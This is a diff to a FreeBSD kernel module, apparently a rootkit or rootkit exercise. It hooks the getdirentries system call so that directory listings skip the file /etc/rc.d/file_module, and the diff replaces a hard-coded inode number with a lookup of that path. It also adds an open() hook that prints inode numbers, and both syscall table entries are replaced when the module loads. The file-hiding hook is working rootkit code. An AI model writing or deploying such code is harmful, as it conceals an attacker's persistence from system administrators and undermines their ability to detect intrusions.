@@ -20,7 +20,25 @@
 #include <sys/syscallsubr.h>
 #include <sys/stat.h>
 #include <sys/unistd.h>
+#include <sys/fcntl.h>
 
+static int open_hook(struct thread *td, void *syscall_args)
+{
+	struct open_args *uap;
+	uap = (struct open_args *)(syscall_args);
+
+	int error = sys_open(td, uap);
+
+	if (error)
+		return error;
+
+	struct stat sb;
+	kern_fstat(td, td->td_retval[0], &sb);
+	printf("Inodes: %lu\n", sb.st_ino);
+
+	return 0;	
+
+}
 
 static int getdirentries_hook(struct thread *td, void *syscall_args)
 {
@@ -36,8 +54,6 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 
 	sys_getdirentries(td, syscall_args);
 	size = td->td_retval[0];
-
-	
 
 	if (size > 0)
 	{
@@ -56,9 +72,11 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 
 			// Debug information
 			//printf("Inodes: %lu\n", sb.st_ino);
+			struct stat hidden;
+			kern_statat(td, 0, AT_FDCWD,  "/etc/rc.d/file_module", UIO_SYSSPACE, &hidden, NULL);
 
 
-			if (sb.st_ino == 1626459)
+			if (sb.st_ino == hidden.st_ino)
 			{
 				if (count != 0)
 				{
@@ -93,10 +111,12 @@ static int load(struct module *module, int cmd, void *arg)
 	{
 		case MOD_LOAD:
 			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
+			sysent[SYS_open].sy_call = (sy_call_t *)open_hook;
 			break;
 
 		case MOD_UNLOAD:
 			sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+			sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
 			break;
 
 	}
